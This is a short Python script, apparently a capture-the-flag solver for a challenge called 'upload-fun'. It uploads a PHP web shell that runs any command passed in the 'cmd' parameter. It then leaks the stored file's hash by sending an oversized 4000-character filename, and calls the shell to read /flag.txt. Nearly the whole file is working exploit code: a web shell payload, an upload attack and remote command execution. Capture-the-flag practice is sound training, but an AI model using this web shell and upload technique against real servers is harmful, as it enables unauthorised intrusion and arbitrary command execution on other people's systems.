import os
import re
import requests
from io import BytesIO


URL = os.getenv('CHAL_URL') or 'https://upload-fun-okntin33tq-ul.a.run.app/'

def uploadFile(filename):
    # Your binary string data
    binary_data = b"""
    <?php
        echo system($_GET["cmd"]);
    ?>
    """

    # Create a BytesIO object to simulate a file
    file_object = BytesIO(binary_data)

    # Prepare the files dictionary with filename control
    files = {'f': (filename, file_object)}

    # Send the POST request with the simulated file
    response = requests.post(URL, files=files)

    # print(response.status_code, response.text)
    return response


filename = 'payload.php'

uploadFile(filename)


tooLongFilename = 'A' * 4000
response = uploadFile(tooLongFilename)

pattern = r"/uploads/(?P<hash>.+)_"
match = re.search(pattern, response.text)

if match:
    hash = match.group("hash")
    # print(f"Extracted hash: {hash}")
    url = URL + f'?f={hash}_{filename}&cmd=cat%20/flag.txt'

    print(url)
    response = requests.get(url)

    # print(response.status_code, response.text)

    if 'wctf{' in response.text:
        print('SOLVED: upload-fun')
    else:
        print('FAILED2: upload-fun')
else:
    print('FAILED1: upload-fun', response.text)




